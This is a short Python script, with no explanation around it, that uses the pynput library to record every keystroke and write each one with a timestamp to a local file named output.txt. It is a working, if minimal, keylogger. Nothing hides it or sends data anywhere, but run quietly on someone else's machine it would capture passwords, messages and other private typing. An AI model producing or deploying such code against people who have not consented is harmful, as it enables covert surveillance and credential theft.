#!/usr/bin/python3
from fileinput import filename
from pynput import keyboard
import logging

logging.basicConfig(
    filename=("output.txt"),
    level=logging.DEBUG,
    format=" %(asctime)s-%(message)s"
)

def on_press(key):
    logging.info(str(key))

with keyboard.Listener(on_press=on_press) \
        as listener:
    listener.join()